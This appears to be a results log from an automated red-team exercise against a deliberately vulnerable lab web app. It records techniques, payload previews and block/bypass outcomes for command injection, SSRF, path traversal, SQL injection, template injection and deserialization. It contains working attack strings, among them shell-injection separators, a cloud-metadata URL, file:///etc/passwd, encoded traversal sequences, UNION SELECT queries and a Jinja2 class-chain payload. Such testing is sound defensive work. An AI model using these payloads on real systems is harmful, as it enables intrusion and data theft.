@@ -1,0 +1,458 @@
+{
+  "iteration": 3,
+  "endpoints": [
+    {
+      "path": "/ping",
+      "vuln": "Command Injection",
+      "cwe": "CWE-78"
+    },
+    {
+      "path": "/fetch",
+      "vuln": "SSRF",
+      "cwe": "CWE-918"
+    },
+    {
+      "path": "/read",
+      "vuln": "Path Traversal",
+      "cwe": "CWE-22"
+    },
+    {
+      "path": "/search",
+      "vuln": "SQL Injection",
+      "cwe": "CWE-89"
+    },
+    {
+      "path": "/render",
+      "vuln": "SSTI",
+      "cwe": "CWE-1336"
+    },
+    {
+      "path": "/load",
+      "vuln": "Insecure Deser.",
+      "cwe": "CWE-502"
+    }
+  ],
+  "edges": [
+    {
+      "endpoint": "/ping",
+      "technique": "basic probe: probe_cmd_injection",
+      "status": "bypassed",
+      "payload_preview": "response contained 'uid=...(' from injected `id`",
+      "source": "probe_cmd_injection",
+      "first_seen_iter": 0,
+      "was_bypassed_before": true,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/ping",
+      "technique": "semicolon injection",
+      "status": "bypassed",
+      "payload_preview": "127.0.0.1; id",
+      "source": "red_cmd_injection",
+      "first_seen_iter": 0,
+      "was_bypassed_before": true,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/ping",
+      "technique": "AND chain",
+      "status": "bypassed",
+      "payload_preview": "127.0.0.1 && id",
+      "source": "red_cmd_injection",
+      "first_seen_iter": 0,
+      "was_bypassed_before": true,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/ping",
+      "technique": "pipe operator",
+      "status": "bypassed",
+      "payload_preview": "127.0.0.1 | id",
+      "source": "red_cmd_injection",
+      "first_seen_iter": 0,
+      "was_bypassed_before": true,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/ping",
+      "technique": "command substitution $()",
+      "status": "blocked",
+      "payload_preview": "$(id)",
+      "source": "red_cmd_injection",
+      "first_seen_iter": 0,
+      "was_bypassed_before": false,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/ping",
+      "technique": "command substitution backtick",
+      "status": "blocked",
+      "payload_preview": "`id`",
+      "source": "red_cmd_injection",
+      "first_seen_iter": 0,
+      "was_bypassed_before": false,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/ping",
+      "technique": "raw: 127.0.0.1",
+      "status": "bypassed",
+      "payload_preview": "127.0.0.1",
+      "source": "red_cmd_injection",
+      "first_seen_iter": 0,
+      "was_bypassed_before": true,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/ping",
+      "technique": "URL-encoded semicolon",
+      "status": "blocked",
+      "payload_preview": "127.0.0.1%3B id",
+      "source": "red_cmd_injection",
+      "first_seen_iter": 0,
+      "was_bypassed_before": false,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/ping",
+      "technique": "IFS bracket trick",
+      "status": "blocked",
+      "payload_preview": "127.0.0.1;{id}",
+      "source": "red_cmd_injection",
+      "first_seen_iter": 0,
+      "was_bypassed_before": false,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/ping",
+      "technique": "tab injection",
+      "status": "blocked",
+      "payload_preview": "127.0.0.1\tid",
+      "source": "red_cmd_injection",
+      "first_seen_iter": 0,
+      "was_bypassed_before": false,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/fetch",
+      "technique": "127.0.0.1 loopback",
+      "status": "bypassed",
+      "payload_preview": "http://127.0.0.1:8080/healthz",
+      "source": "red_ssrf",
+      "first_seen_iter": 0,
+      "was_bypassed_before": true,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/fetch",
+      "technique": "localhost hostname",
+      "status": "bypassed",
+      "payload_preview": "http://localhost:8080/healthz",
+      "source": "red_ssrf",
+      "first_seen_iter": 0,
+      "was_bypassed_before": true,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/fetch",
+      "technique": "cloud metadata IP",
+      "status": "blocked",
+      "payload_preview": "http://169.254.169.254/latest/meta-data/",
+      "source": "red_ssrf",
+      "first_seen_iter": 0,
+      "was_bypassed_before": false,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/fetch",
+      "technique": "file:// scheme",
+      "status": "blocked",
+      "payload_preview": "file:///etc/passwd",
+      "source": "red_ssrf",
+      "first_seen_iter": 0,
+      "was_bypassed_before": false,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/fetch",
+      "technique": "docker host bridge",
+      "status": "blocked",
+      "payload_preview": "http://host.docker.internal:8080/healthz",
+      "source": "red_ssrf",
+      "first_seen_iter": 0,
+      "was_bypassed_before": false,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/fetch",
+      "technique": "decimal IP loopback",
+      "status": "bypassed",
+      "payload_preview": "http://2130706433:8080/healthz",
+      "source": "red_ssrf",
+      "first_seen_iter": 0,
+      "was_bypassed_before": true,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/read",
+      "technique": "literal dot-dot",
+      "status": "bypassed",
+      "payload_preview": "../../tmp/path_canary.txt",
+      "source": "red_path_traversal",
+      "first_seen_iter": 0,
+      "was_bypassed_before": true,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/read",
+      "technique": "double-dot bypass",
+      "status": "blocked",
+      "payload_preview": "....//....//tmp/path_canary.txt",
+      "source": "red_path_traversal",
+      "first_seen_iter": 0,
+      "was_bypassed_before": false,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/read",
+      "technique": "URL-encoded slash",
+      "status": "bypassed",
+      "payload_preview": "..%2f..%2f..%2ftmp%2fpath_canary.txt",
+      "source": "red_path_traversal",
+      "first_seen_iter": 0,
+      "was_bypassed_before": true,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/read",
+      "technique": "URL-encoded dot-dot",
+      "status": "bypassed",
+      "payload_preview": "%2e%2e/%2e%2e/%2e%2e/tmp/path_canary.txt",
+      "source": "red_path_traversal",
+      "first_seen_iter": 0,
+      "was_bypassed_before": true,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/read",
+      "technique": "absolute path",
+      "status": "bypassed",
+      "payload_preview": "/tmp/path_canary.txt",
+      "source": "red_path_traversal",
+      "first_seen_iter": 0,
+      "was_bypassed_before": true,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/search",
+      "technique": "UNION SELECT",
+      "status": "blocked",
+      "payload_preview": "' UNION SELECT id,flag,'x','x' FROM secrets--",
+      "source": "red_sqli",
+      "first_seen_iter": 0,
+      "was_bypassed_before": false,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/search",
+      "technique": "OR 1=1 boolean",
+      "status": "blocked",
+      "payload_preview": "admin' OR '1'='1",
+      "source": "red_sqli",
+      "first_seen_iter": 0,
+      "was_bypassed_before": false,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/search",
+      "technique": "semicolon injection",
+      "status": "blocked",
+      "payload_preview": "admin'; SELECT flag FROM secrets--",
+      "source": "red_sqli",
+      "first_seen_iter": 0,
+      "was_bypassed_before": false,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/search",
+      "technique": "URL-encoded UNION",
+      "status": "bypassed",
+      "payload_preview": "%27%20UNION%20SELECT%20id%2Cflag%2C%27x%27%2C%27x%27%20FROM%20secrets--",
+      "source": "red_sqli",
+      "first_seen_iter": 0,
+      "was_bypassed_before": true,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/render",
+      "technique": "canary leak (sandbox off)",
+      "status": "bypassed",
+      "payload_preview": "canary leaked (sandbox off)",
+      "source": "red_ssti",
+      "first_seen_iter": 0,
+      "was_bypassed_before": true,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/render",
+      "technique": "math eval",
+      "status": "bypassed",
+      "payload_preview": "7*7=49 executed",
+      "source": "red_ssti",
+      "first_seen_iter": 0,
+      "was_bypassed_before": true,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/render",
+      "technique": "__class__ chain",
+      "status": "blocked",
+      "payload_preview": "{{\"\".__class__.__mro__[1].__subclasses__()}}",
+      "source": "red_ssti",
+      "first_seen_iter": 0,
+      "was_bypassed_before": false,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/render",
+      "technique": "config leak",
+      "status": "blocked",
+      "payload_preview": "{{config}}",
+      "source": "red_ssti",
+      "first_seen_iter": 0,
+      "was_bypassed_before": false,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/render",
+      "technique": "SSTI RCE",
+      "status": "bypassed",
+      "payload_preview": "code execution",
+      "source": "red_ssti",
+      "first_seen_iter": 0,
+      "was_bypassed_before": true,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/load",
+      "technique": "pickle opcode manipulation with base64 encoding to bypass pattern matching",
+      "status": "blocked",
+      "payload_preview": "no match (HTTP 500)",
+      "source": "dyn_deser_1",
+      "first_seen_iter": 3,
+      "was_bypassed_before": false,
+      "novel": true,
+      "severed": false
+    },
+    {
+      "endpoint": "/load",
+      "technique": "base64-encoded pickle with indirect function reference",
+      "status": "blocked",
+      "payload_preview": "no match (HTTP 500)",
+      "source": "dyn_deser_2",
+      "first_seen_iter": 3,
+      "was_bypassed_before": false,
+      "novel": true,
+      "severed": false
+    },
+    {
+      "endpoint": "/ping",
+      "technique": "semicolon command separator (not in block_patterns)",
+      "status": "blocked",
+      "payload_preview": "no match (HTTP 200)",
+      "source": "dyn_cmd_2",
+      "first_seen_iter": 2,
+      "was_bypassed_before": true,
+      "novel": false,
+      "severed": true
+    },
+    {
+      "endpoint": "/ping",
+      "technique": "double ampersand bypasses single & block via context",
+      "status": "bypassed",
+      "payload_preview": "BYPASS via double ampersand bypasses single & block via context; fallback match:",
+      "source": "dyn_cmd_3",
+      "first_seen_iter": 3,
+      "was_bypassed_before": false,
+      "novel": true,
+      "severed": false
+    },
+    {
+      "endpoint": "/fetch",
+      "technique": "direct localhost IP (may bypass hostname allowlist)",
+      "status": "bypassed",
+      "payload_preview": "BYPASS via direct localhost IP (may bypass hostname allowlist); canary=CANARY_SS",
+      "source": "dyn_ssrf_2",
+      "first_seen_iter": 2,
+      "was_bypassed_before": true,
+      "novel": false,
+      "severed": false
+    },
+    {
+      "endpoint": "/search",
+      "technique": "UNION-based SQLi to extract secrets table",
+      "status": "blocked",
+      "payload_preview": "no match (HTTP 500)",
+      "source": "dyn_sqli_2",
+      "first_seen_iter": 3,
+      "was_bypassed_before": false,
+      "novel": true,
+      "severed": false
+    },
+    {
+      "endpoint": "/render",
+      "technique": "Jinja2 config object access (alternative to underscore-prefixed attrs)",
+      "status": "blocked",
+      "payload_preview": "no match (HTTP 200)",
+      "source": "dyn_ssti_2",
+      "first_seen_iter": 3,
+      "was_bypassed_before": false,
+      "novel": true,
+      "severed": false
+    }
+  ],
+  "endpoint_status": {
+    "/ping": "compromised",
+    "/fetch": "compromised",
+    "/read": "compromised",
+    "/search": "compromised",
+    "/render": "compromised",
+    "/load": "defended"
+  },
+  "stats": {
+    "total_edges": 37,
+    "bypassed": 18,
+    "blocked": 19,
+    "compromised_endpoints": 5
+  }
+}
